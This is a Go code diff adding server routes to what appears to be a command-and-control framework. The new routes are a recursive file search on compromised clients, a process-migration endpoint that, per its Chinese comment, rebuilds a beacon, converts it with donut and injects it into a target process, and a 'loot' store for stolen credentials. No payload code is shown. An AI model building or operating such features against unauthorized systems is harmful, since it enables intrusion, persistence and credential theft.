@@ -487,6 +487,7 @@ func main() {
 	protected.GET("/client/pid", api.GetPidList)
 	operatorOnly.POST("/client/pid/kill", api.KillPid)
 	fileAPI.POST("/client/file/tree", api.FileBrowse)
+	fileAPI.POST("/client/file/search", api.FileSearch) // 递归文件搜索(结果复用 file/tree 格式)
 	operatorFile.POST("/client/file/delete", api.FileDelete)
 	operatorFile.POST("/client/file/mkdir", api.MakeDir)
 	operatorFile.POST("/client/file/create", api.CreateFile)
@@ -545,6 +546,8 @@ func main() {
 	operatorOnly.POST("/bin/execute", api.ExecuteBin)
 	// 内存注入（纯内存通道，不落盘；替代原文件路径注入）
 	operatorOnly.POST("/client/inject-mem", api.InjectMem)
+	// 进程迁移（重上线式：重建同配置 beacon→donut→注入目标进程→原进程退出）
+	operatorOnly.POST("/client/migrate", api.Migrate)
 
 	// 屏幕监控功能（【RBAC修复】监控/截图属敏感操作，仅 admin+operator）
 	operatorOnly.POST("/client/monitor/start", api.StartScreenMonitor)
@@ -674,6 +677,17 @@ func main() {
 		auditAPI.GET("/statistics", audit.GetAuditStatistics)
 		auditAPI.GET("/export", audit.ExportAuditLogs)
 		auditAPI.DELETE("/cleanup", audit.CleanupOldLogs)
+	}
+
+	// Loot 凭据/制品库(读:全部登录角色;写:operator+;凭据属敏感数据)
+	lootRead := protected.Group("/loot")
+	{
+		lootRead.GET("", api.ListLoot)
+	}
+	lootWrite := operatorOnly.Group("/loot")
+	{
+		lootWrite.POST("", api.AddLoot)
+		lootWrite.DELETE("/:id", api.DeleteLoot)
 	}
 
 	// 连接管理API
